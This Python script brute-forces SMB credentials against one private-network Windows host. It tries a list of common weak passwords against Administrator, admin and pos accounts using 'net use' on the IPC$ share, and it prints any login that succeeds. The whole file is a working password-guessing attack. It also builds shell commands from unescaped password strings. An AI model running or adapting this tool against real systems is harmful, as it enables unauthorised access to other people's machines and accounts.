import subprocess

ip = "10.8.45.11"
# Test accounts and passwords
passwords = [
    "1234a@", "cHH!3#+@", "123456", "Administrator", "123456aA@", "admin", "123456@", "Aa@123456", "Admin@123", "P@ssw0rd"
]
users = [
    "Administrator", r".\Administrator", "pos", r".\pos", "admin", r".\admin"
]

print("Testing credentials against 10.8.45.11...")
for u in users:
    for p in passwords:
        cmd = f'net use \\\\{ip}\\IPC$ "{p}" /user:"{u}"'
        res = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        if res.returncode == 0:
            print(f"===> SUCCESS! User: {u} | Pass: {p}")
            subprocess.run(f"net use \\\\{ip}\\IPC$ /delete /y", capture_output=True, shell=True)
            break
        else:
            if "1326" in res.stderr: # Logon failure
                pass
            elif "53" in res.stderr: # Network path not found
                print("Error 53: Network path not found")
                break
            elif "5" in res.stderr: # Access denied
                pass
print("Test completed.")
